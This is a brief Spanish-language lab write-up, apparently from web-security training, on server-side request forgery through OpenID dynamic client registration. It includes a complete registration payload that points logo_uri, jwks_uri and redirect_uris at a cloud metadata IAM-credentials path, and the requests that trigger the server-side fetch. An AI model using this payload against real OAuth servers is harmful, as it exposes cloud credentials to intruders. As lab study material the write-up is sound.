---
title: "2 - SSRF via OpenID dynamic client registration"
---

# 2 - SSRF via OpenID dynamic client registration

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
/.well-known/jwks.json
```

Para saber si se está usando openid tiene que estar en el scope.
Además se tiene que recibir en la respuesta un id_token.

___

En este lab `/openid/register` está expuesto y es posible usarlo para registrar a un cliente (aplicación que quiere usar el servicio de oauth) con `logo_uri` ,`jwks_uri` y `redirect_uris` maliciosas, que apunten a servicios internos -> SSRF

Estamos ante **Authorization Code Grant Type** (response_type=code) :

Accedemos a `https://oauth-0aba000a03d782bf807db517023200c5.oauth-server.net/.well-known/openid-configuration`

Nos tira que el endpoint de registro está en `https://oauth-0aba000a03d782bf807db517023200c5.oauth-server.net/reg`

Enviamos un POST con este body

```json
{
  "application_type": "web",
  "redirect_uris": [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
  ],
  "client_name": "Example OIDC Client",
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
  "token_endpoint_auth_method": "client_secret_basic",
  "grant_types": ["authorization_code", "refresh_token"],
  "response_types": ["code"],
  "scope": "openid email profile",
  "jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
  "userinfo_signed_response_alg": "RS256",
  "id_token_signed_response_alg": "RS256"
}
```

Con este hemos creado un nuevo cliente, podemos loguearnos a ese cliente :

```
https://oauth-0aba000a03d782bf807db517023200c5.oauth-server.net/auth?client_id=kzkmrumn1lo2041pfbjtr&redirect_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&response_type=code&scope=openid%20profile%20email
```

Para que nos cargue el loco internamente al confirmar el login en opeind .

O podemos acceder al logo del cliente directamente :

```HTTP
GET /client/CLIENT-ID/logo
```
